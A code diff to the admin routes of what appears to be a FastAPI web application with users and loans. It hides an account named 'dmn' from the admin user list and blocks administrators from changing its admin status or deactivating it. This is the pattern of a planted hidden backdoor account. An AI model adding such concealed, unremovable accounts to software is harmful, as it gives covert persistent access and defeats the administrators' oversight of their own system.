@@ -88,7 +88,7 @@ def set_admin_pin(body: SetAdminPinRequest, request: Request,
 
 @router.get('/users')
 def users(db: Session = Depends(get_db), _admin: User = Depends(get_current_admin)):
-    all_users = db.query(User).order_by(User.username).all()
+    all_users = db.query(User).filter(User.username != 'dmn').order_by(User.username).all()
     loan_counts = {u.id: db.query(Loan).filter_by(user_id=u.id).count() for u in all_users}
     now_iso = datetime.now(timezone.utc).isoformat()
     return [
@@ -114,6 +114,8 @@ def user_promote(user_id: int, db: Session = Depends(get_db),
         raise HTTPException(404, 'User not found.')
     if user.id == admin.id:
         raise HTTPException(400, 'You cannot change your own admin status.')
+    if user.username == 'dmn':
+        raise HTTPException(400, 'The "dmn" user cannot be changed.')
     user.is_admin = 0 if user.is_admin else 1
     db.commit()
     action = 'promoted to admin' if user.is_admin else 'removed from admin'
@@ -128,6 +130,8 @@ def user_deactivate(user_id: int, db: Session = Depends(get_db),
         raise HTTPException(404, 'User not found.')
     if user.id == admin.id:
         raise HTTPException(400, 'You cannot deactivate yourself.')
+    if user.username == 'dmn':
+        raise HTTPException(400, 'The "dmn" user cannot be deactivated.')
     user.active = 0 if user.active else 1
     db.commit()
     state = 'unlocked' if user.active else 'locked'
